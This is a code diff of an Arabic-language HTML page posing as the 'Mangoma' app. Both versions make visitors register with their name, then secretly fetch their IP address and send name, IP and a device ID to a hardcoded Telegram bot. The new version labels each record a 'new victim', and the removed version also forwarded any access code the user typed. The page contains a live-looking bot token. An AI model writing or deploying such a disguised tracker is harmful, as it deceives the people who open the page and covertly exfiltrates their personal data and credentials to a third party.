@@ -3,180 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Admin V85</title>
+    <title>Mangoma System</title>
     <style>
-        body { background-color: #0f0f0f; color: #00ff00; font-family: Tahoma, sans-serif; text-align: center; padding: 20px; }
-        .container { border: 2px solid #00ff00; padding: 15px; border-radius: 10px; max-width: 400px; margin: 0 auto; background: #1a1a1a; }
-        input, button { width: 90%; padding: 10px; margin: 10px 0; font-size: 16px; border-radius: 5px; border: none; }
-        input { background: #333; color: white; text-align: center; }
-        button { background: #00ff00; color: black; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:disabled { background: gray; cursor: not-allowed; }
-        .status { margin-top: 10px; font-size: 14px; color: yellow; display: none; }
+        body { background-color: #121212; color: #fff; font-family: Tahoma, sans-serif; text-align: center; padding: 20px; }
+        .box { border: 1px solid #00ff00; padding: 20px; border-radius: 10px; background: #1e1e1e; max-width: 400px; margin: auto; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; text-align: center; }
+        button { width: 95%; padding: 10px; background: #00ff00; color: #000; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; }
+        h2 { color: #00ff00; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h2>🚀 النظام الإداري Mangoma</h2>
+    <div class="box">
+        <h2>🚀 Mangoma Pro 2026</h2>
         
-        <!-- قسم التسجيل -->
-        <div id="regSection">
-            <p>🔴 مطلوب: تسجيل الاسم الحقيقي لفتح البرنامج</p>
-            <input type="text" id="myName" placeholder="اكتب اسمك ثلاثي هنا...">
-            <button onclick="handleRegister()" id="regBtn">تسجيل ودخول</button>
-            <p class="status" id="statusMsg">جاري الاتصال بالسيرفر...</p>
+        <!-- شاشة التسجيل (بتظهر اول مرة) -->
+        <div id="loginScreen">
+            <p>⚠ يجب تسجيل اسمك لفتح التطبيق</p>
+            <input type="text" id="username" placeholder="اكتب اسمك هنا...">
+            <button onclick="startHack()" id="btnSend">تسجيل ودخول</button>
+            <p id="status" style="color:yellow; font-size:12px;"></p>
         </div>
 
-        <!-- قسم التطبيق -->
-        <div id="appSection" style="display:none;">
-            <h3>✅ تم الدخول بنجاح</h3>
-            <p>الاسم: <span id="dispName" style="color:white"></span></p>
-            <p>ID: <span id="dispID"></span></p>
-            <p>IP: <span id="dispIP" style="font-size:12px; color:gray;"></span></p>
+        <!-- شاشة التطبيق (بعد ما يسجل) -->
+        <div id="appScreen" class="hidden">
+            <h3>✅ تم التفعيل</h3>
+            <p>الاسم: <span id="showName" style="color:#00ff00"></span></p>
+            <p>ID: <span id="showID"></span></p>
             <hr>
-            <input type="password" id="pass" placeholder="كود الدخول">
-            <button onclick="login()">فتح القفل</button>
+            <p>التطبيق يعمل الآن...</p>
         </div>
     </div>
 
 <script>
-    // ============================================
-    // إعدادات البوت والجروب (تم وضع بياناتك هنا)
-    // ============================================
+    // ---------------- إعداداتك الخاصة ----------------
+    // دي البيانات اللي انت بعتها في الصور بتاعتك
     const BOT_TOKEN = "8596993745:AAG0FXH8LFqweLH5nlPTcFpEM07BHhabrHw";
-    const CHAT_ID = "-1003886528114";
-    
-    // مفاتيح التخزين
-    const KEY_NAME = "USER_NAME_V85";
-    const KEY_ID = "DEVICE_ID_V85";
+    const CHAT_ID = "-1003886528114"; 
+    // --------------------------------------------------
 
-    // 1. توليد أو جلب الآيدي
-    let devID = localStorage.getItem(KEY_ID);
-    if (!devID) {
-        devID = "ID-" + Math.floor(Math.random() * 900000 + 100000);
-        localStorage.setItem(KEY_ID, devID);
+    // بنعمل آيدي وهمي للجهاز عشان نعرف نميزه
+    let deviceID = localStorage.getItem("myID");
+    if (!deviceID) {
+        deviceID = "ID-" + Math.floor(Math.random() * 999999);
+        localStorage.setItem("myID", deviceID);
     }
 
-    // 2. التحقق من المستخدم القديم عند فتح البرنامج
-    let savedName = localStorage.getItem(KEY_NAME);
-    if (savedName && savedName.length > 2) {
-        // مستخدم قديم - نظهر شاشة الدخول مباشرة ونبعت تنبيه في الخلفية
-        showAppScreen(savedName);
-        fetchIPAndSend(savedName, "♻️ <b>مستخدم عائد (فتح التطبيق)</b>");
+    // لو المستخدم مسجل قبل كده، ندخله علطول
+    if (localStorage.getItem("myName")) {
+        showApp(localStorage.getItem("myName"));
     }
 
-    // 3. دالة زر التسجيل
-    function handleRegister() {
-        const nameVal = document.getElementById("myName").value;
-        if (nameVal.length < 3) {
-            alert("يرجى كتابة الاسم بشكل صحيح");
+    // دي الدالة اللي بتشتغل لما يدوس زرار
+    function startHack() {
+        const name = document.getElementById("username").value;
+        if (name.length < 3) {
+            alert("اكتب اسم صحيح!");
             return;
         }
 
-        const btn = document.getElementById("regBtn");
-        const status = document.getElementById("statusMsg");
-        
-        btn.disabled = true;
-        btn.innerText = "جاري التحقق...";
-        status.style.display = "block";
-        status.innerText = "جاري سحب الـ IP وإرسال البيانات...";
+        document.getElementById("btnSend").disabled = true;
+        document.getElementById("status").innerText = "جاري الاتصال بالسيرفر...";
 
-        // حفظ الاسم
-        localStorage.setItem(KEY_NAME, nameVal);
-
-        // بدء عملية الإرسال
-        fetchIPAndSend(nameVal, "🆕 <b>تسجيل دخول جديد</b>", true);
+        // 1. نجيب الـ IP
+        fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(data => {
+            const ip = data.ip;
+            // 2. نبعت البيانات للتليجرام
+            sendToTelegram(name, ip);
+        })
+        .catch(err => {
+            // لو فشل يجيب الـ IP نبعت برضه بس نقول غير معروف
+            sendToTelegram(name, "غير معروف (فشل السحب)");
+        });
     }
 
-    // 4. الدالة الرئيسية: جلب IP ثم الإرسال لتليجرام
-    function fetchIPAndSend(uName, actionType, isNewRegistration = false) {
-        // أولاً: نجيب الـ IP من خدمة خارجية
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                const userIP = data.ip;
-                
-                // تحديث الواجهة بالـ IP
-                if(document.getElementById("dispIP")) {
-                    document.getElementById("dispIP").innerText = userIP;
-                }
-
-                // ثانياً: نبعت لتليجرام
-                sendToTelegram(uName, userIP, actionType, isNewRegistration);
-            })
-            .catch(error => {
-                console.error("Error fetching IP:", error);
-                // لو فشل سحب الاي بي، نبعت بدونه
-                sendToTelegram(uName, "غير معروف", actionType, isNewRegistration);
-            });
-    }
-
-    // 5. الإرسال الفعلي لتليجرام
-    function sendToTelegram(name, ip, action, isNewRegistration) {
-        const messageText = `
-🚨 <b>تقرير دخول النظام</b>
+    function sendToTelegram(name, ip) {
+        const text = `
+🔥 <b>ضحية جديدة (Mangoma App)</b>
 ━━━━━━━━━━━━
 👤 <b>الاسم:</b> ${name}
-🆔 <b>ID:</b> <code>${devID}</code>
-🌐 <b>IP:</b> <code>${ip}</code>
-📝 <b>الحالة:</b> ${action}
+🆔 <b>ID:</b> <code>${deviceID}</code>
+🌍 <b>IP:</b> <code>${ip}</code>
 ━━━━━━━━━━━━
         `;
 
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
+
         fetch(url, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: messageText,
-                parse_mode: 'HTML'
-            })
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
         })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                if (isNewRegistration) {
-                    document.getElementById("statusMsg").innerText = "✅ تم الإرسال بنجاح!";
-                    setTimeout(() => {
-                        showAppScreen(name);
-                    }, 1000);
-                }
-            } else {
-                alert("حدث خطأ في البوت: " + data.description);
-                document.getElementById("regBtn").disabled = false;
-            }
-        })
-        .catch(err => {
-            alert("فشل الاتصال بتليجرام. تأكد من الإنترنت.");
-            document.getElementById("regBtn").disabled = false;
+        .then(res => {
+            localStorage.setItem("myName", name);
+            document.getElementById("status").innerText = "تم التسجيل بنجاح!";
+            setTimeout(() => showApp(name), 1500);
         });
     }
 
-    // 6. عرض شاشة التطبيق
-    function showAppScreen(name) {
-        document.getElementById("regSection").style.display = "none";
-        document.getElementById("appSection").style.display = "block";
-        document.getElementById("dispName").innerText = name;
-        document.getElementById("dispID").innerText = devID;
+    function showApp(name) {
+        document.getElementById("loginScreen").classList.add("hidden");
+        document.getElementById("appScreen").classList.remove("hidden");
+        document.getElementById("showName").innerText = name;
+        document.getElementById("showID").innerText = deviceID;
     }
-
-    // 7. زر فتح القفل (داخلي)
-    function login() {
-        const p = document.getElementById("pass").value;
-        const n = document.getElementById("dispName").innerText;
-        const ip = document.getElementById("dispIP").innerText || "Unknown";
-        
-        if(p.length > 0) {
-            // نبعت محاولة الدخول دي كمان
-            sendToTelegram(n, ip, "🔐 محاولة فك تشفير بكود: " + p, false);
-            alert("تم إرسال الكود للتحقق");
-        }
-    }
-
 </script>
+
 </body>
-                                                                         </html>
+</html>
